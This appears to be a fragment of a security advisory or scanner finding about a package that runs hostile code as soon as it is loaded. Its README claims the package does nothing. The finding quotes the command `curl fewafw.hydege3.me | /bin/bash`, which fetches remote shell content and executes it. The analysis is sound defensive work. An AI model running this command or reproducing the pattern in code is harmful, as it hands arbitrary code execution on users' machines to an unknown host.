  "summary": "Load-time remote shell execution from anonymous host",
  "details": "On require()/import, index.js unconditionally executes `curl fewafw.hydege3.me | /bin/bash`, fetching and running attacker-controlled shell content from an anonymous third-party host over unpinned, unverified HTTP. The package.json description and README claim the module has no functionality, no dependencies, and no install scripts, directly contradicting the actual code path and functioning as cover for the remote-execution payload. Any consumer that loads this package receives arbitrary code execution on the installer's machine at library-load time.",
